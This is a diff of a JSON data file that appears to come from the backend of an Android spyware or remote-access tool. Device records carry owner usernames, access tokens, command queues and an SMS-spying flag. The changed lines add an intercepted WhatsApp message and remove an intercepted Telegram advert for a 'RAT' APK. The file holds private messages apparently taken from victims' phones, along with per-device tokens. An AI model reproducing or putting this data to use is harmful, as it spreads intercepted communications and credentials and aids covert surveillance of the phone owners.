@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776773619821,
+    "lastSeen": 1776773644766,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776773622168,
+    "lastSeen": 1776773643487,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773621099,
+    "lastSeen": 1776773645120,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "bintang",
+        "content": "ya",
+        "time": "21/04 19:14",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773645874
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:16",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776770211615
-      },
-      {
-        "appName": "Telegram",
-        "sender": "LearnTermuxHUB.Tools: 𝐃𝐈𝐓𝐙 𝐆𝐀𝐍𝐓𝐄𝐍𝐆",
-        "content": "APK BUG X RAT 5K PV @Napkxiua PERMANEN FULL UP",
-        "time": "21/04 18:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776770211473
       }
     ],
     "galleryPhotos": [],
